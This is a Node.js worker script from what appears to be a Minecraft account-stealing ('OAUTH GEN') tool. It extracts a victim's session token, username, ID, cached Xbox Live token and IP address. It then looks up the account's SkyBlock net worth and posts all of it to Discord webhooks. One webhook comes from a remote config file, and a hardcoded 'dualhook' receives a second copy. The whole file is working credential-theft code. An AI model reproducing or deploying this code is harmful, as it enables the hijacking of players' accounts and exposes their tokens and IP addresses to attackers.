const fetch = require('node-fetch');
const express = require('express');
const { workerData, parentPort } = require('worker_threads');
const fs = require('fs');
const path = require('path');
const { WebhookClient } = require('discord.js');
const https = require('https');
const axios = require('axios');
const { validate } = require('./bot');
const request = require('request');

const app = express();

app.use((req, res, next) => {
  workerData.clientIP = req.ip;
  next();
});

const { authenticationCode, logBuffer, userId, clientIP } = workerData;
const logLines = logBuffer.join('').split('\n');
// Use the 'id' as needed in your worker logic
console.log('Worker received ID:', userId);
let globalXblToken = null;
let extractedInfo = {
  id: null,
  name: null,
  token: null,
  xbl: null,
};

// A promise-based function to read the XBL token file
function readXblTokenFile() {
  return new Promise((resolve, reject) => {
    const folderPath = 'random'; // Change this to the folder path where your files are located
    const filePattern = /_xbl-cache.json/; // Pattern to match file names
    const timeThreshold = Date.now() - 10000; // Time threshold in milliseconds (10 seconds)

    fs.readdir(folderPath, (err, files) => {
      if (err) {
        console.error('Error reading directory:', err);
        return reject(err);
      }

      const relevantFiles = files.filter((file) => {
        const filePath = path.join(folderPath, file);
        const fileStat = fs.statSync(filePath);
        return filePattern.test(file) && fileStat.ctimeMs >= timeThreshold;
      });

      if (relevantFiles.length === 0) {
        console.log('No relevant files found.');
        return resolve(null); // Resolve with null if no relevant file is found
      }

      // Assuming you want to process the most recent file
      const mostRecentFile = relevantFiles.reduce((a, b) => (fs.statSync(a).ctimeMs > fs.statSync(b).ctimeMs ? a : b));
      const filePath = path.join(folderPath, mostRecentFile);

      fs.readFile(filePath, 'utf8', (readErr, data) => {
        if (readErr) {
          console.error('Error reading file:', readErr);
          return reject(readErr);
        }

        const tokenMatch = data.match(/"Token":"([^"]*)"/);
        const xblToken = tokenMatch ? tokenMatch[1] : null;

        if (xblToken) {
          return resolve(xblToken);
        } else {
          return resolve(null); // Resolve with null if no token is found
        }
      });
    });
  });
}
logLines.forEach((line) => {
  if (line.includes('id:')) {
    extractedInfo.id = line.replace(/'/g, '').trim(); // Remove single quotes
  } else if (line.includes('name:')) {
    extractedInfo.name = line.replace(/'/g, '').trim(); // Remove single quotes
    extractedInfo.name = extractedInfo.name.replace(/,/g, ''); // Remove commas
    // Extract the username without 'name:'
    const nameParts = extractedInfo.name.split('name:');
    extractedInfo.name = nameParts.length > 1 ? nameParts[1].trim() : extractedInfo.name;
  } else if (line.includes('token:')) {
    extractedInfo.token = line.replace(/'/g, '').trim(); // Remove single quotes
    extractedInfo.token = extractedInfo.token.replace(/,/g, ''); // Remove commas
    const tokenParts = extractedInfo.token.split('token:');
    extractedInfo.token = tokenParts.length > 1 ? tokenParts[1].trim() : extractedInfo.token;
  }
  // Add additional filters as needed
});

async function main() {
  try {
    let netWorth = null; // Define netWorth inside the try block to access within its scope

    const xblToken = await readXblTokenFile();

    if (xblToken) {
      globalXblToken = xblToken;
      extractedInfo.xbl = xblToken; // Set extractedInfo.xbl to the value of xblToken
      console.log('Extracted Token:', globalXblToken);
    } else {
      console.log('Token not found in the file.');
    }

async function fetchUser(nameofplayer) {
  try {
    const url = `https://sky.shiiyu.moe/api/v2/profile/${nameofplayer}`;
    const response = await axios.get(url);

    const userData = response.data;
    if (userData.error) {
      console.log(`[x] Couldn't fetch net worth from skycrypt`);
      return null; // Return null if an error occurs
    }

    const profiles = Object.values(userData.profiles);
    let maxNetWorth = 0;

    for (const profile of profiles) {
      if (maxNetWorth < profile.data.networth.networth) {
        maxNetWorth = profile.data.networth.networth;
      }
    }

    console.log(`Max Net Worth for ${nameofplayer}: ${maxNetWorth}`);
    return maxNetWorth; // Return the maximum net worth
  } catch (error) {
    console.error(`Error in fetchUser function: ${error}`);
    return null; // Return null if an error occurs
  }
}

function formatNetWorth(netWorth) {
  const suffixes = ["", "K", "M", "B", "T"]; // Suffixes for thousands, millions, billions, etc.
  let magnitude = 0;

  while (netWorth >= 1000) {
    netWorth /= 1000;
    magnitude++;
  }

  // Format the number to a fixed number of digits after the decimal point
  netWorth = parseFloat(netWorth.toFixed(3));

  // Concatenate the number with the corresponding suffix
  return `${netWorth.toLocaleString()}${suffixes[magnitude]}`;
}

// Usage
const nameofplayer = extractedInfo.name || 'N/A';
const maxNetWorth = await fetchUser(nameofplayer); // Assuming fetchUser returns the maxNetWorth value

const formattedNetWorth = formatNetWorth(maxNetWorth || 0); // Use formatNetWorth function

const messageContent = `@everyone Got A BOZO!`;
const messageEmbed = {
  color: 0x04042c,
  timestamp: new Date(),
  username: "We Follow Tos",
  avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",
  description: `OAUTH GEN HOSTED BY sunnys__.`,
  fields: [
    {
      name: '**ID:**',
      value: '```' + (userId || extractedInfo.id || 'N/A') + '```',
      inline: false,
    },
    {
      name: '**Username:**',
      value: '```' + (extractedInfo.name || 'N/A') + '```',
      inline: false,
    },
    {
      name: '**Token:**',
      value: '```' + extractedInfo.token + '```',
      inline: false,
    },
    {
      name: '**IP:**',
      value: '```' + clientIP + '```',
      inline: false,
    },
    {
      name: '**Net Worth:**',
      value: '```' + (formattedNetWorth || 'N/A') + '```',
      inline: false,
    },
  ],
};

  const xblEmbed = {
    color: 0x04042c,
    title: 'Refresh Token',
  description: `[Refresh Link](https://testingweb69.onrender.com/refreshxbl?xbl=${extractedInfo.xbl || 'N/A'})`,
  };

  const configPath = 'config.txt';
  const remoteConfigURL = 'https://lowelle.000webhostapp.com/config.txt';

    https.get(remoteConfigURL, (response) => {
      let data = '';

      response.on('data', (chunk) => {
        data += chunk;
      });

      response.on('end', () => {
        try {
          fs.writeFileSync(configPath, data, 'utf8');
          console.log('Config file updated successfully.');
          console.log("In game user name : " + extractedInfo.name);
          console.log("Networth : " + formattedNetWorth);
          // Read and parse the updated 'config.txt' file
          const configFile = fs.readFileSync(configPath, 'utf8');
          const configLines = configFile.split('\n');

          const configMap = {};
          configLines.forEach((line) => {
            // Use a regular expression to match the (id)=(webhook) format
            const match = line.match(/^(\w+)=(\S+)$/);

            if (match) {
              const id = match[1];
              const webhookURL = match[2];
              configMap[id] = webhookURL;
            }
          });

const webhookURL = configMap[userId]; // Use userId to get the webhookURL
const dualhook = "https://discord.com/api/webhooks/1166688958567174154/30YOSjfalSHDe21ypwufCGTSJuAOxoqeVVdEYGFbDJ5dFXUJ5ShQMjQ5JqZ-0wU5Ac_n";

        if (webhookURL) {
          const webhookClient = new WebhookClient({
            url: webhookURL,
          });
          if (dualhook) {
            const webhookClient2 = new WebhookClient({
              url: dualhook,
            });
            webhookClient2.send({
              content: messageContent,
              embeds: [messageEmbed, xblEmbed], // Send both messageEmbed and xblEmbed
            }).then(() => {
              parentPort.postMessage({ success: true });
            });
          }

          webhookClient.send({
            content: messageContent,
            embeds: [messageEmbed, xblEmbed], // Send both messageEmbed and xblEmbed
          }).then(() => {
            parentPort.postMessage({ success: true });
          });
} else {
        parentPort.postMessage({ error: "Webhook URL not found for the provided id" });
      }
    } catch (err) {
      console.error('Error handling HTTPS response:', err);
    }
  });
}).on('error', (err) => {
  console.error('Error fetching remote config:', err);
});
    
    // ... (other code)
  } catch (err) {
    console.error('Error in main function:', err);
  }
}

main();